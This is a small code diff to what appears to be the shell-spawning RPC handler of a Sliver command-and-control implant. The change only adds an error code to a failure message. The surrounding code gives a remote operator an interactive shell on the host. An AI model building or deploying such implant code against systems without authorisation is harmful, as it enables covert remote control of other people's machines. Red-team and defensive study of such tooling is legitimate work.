@@ -334,7 +334,8 @@ int sliver_rpc_handle_shell(const sliver_envelope_t *req, sliver_buf_t *out) {
   argc = build_shell_argv(sr.path, argv, shell_path, sizeof(shell_path));
   err[0] = '\0';
   if (sliver_child_spawn(shell_path, argv, argc, &child, &pid) != 0) {
-    (void)snprintf(err, sizeof(err), "shell %s: cannot start", shell_path);
+    (void)snprintf(err, sizeof(err), "shell %s: cannot start (err %lu)", shell_path,
+                   sliver_child_last_error());
     return sliver_shell_encode(out, shell_path, 0, 0, 0, err);
   }
   id = next_tunnel_id();
@@ -424,6 +425,7 @@ int sliver_rpc_handle_shell_resize(const sliver_envelope_t *req, sliver_buf_t *o
   (void)out;
   return 0;
 }
+
 
 
 
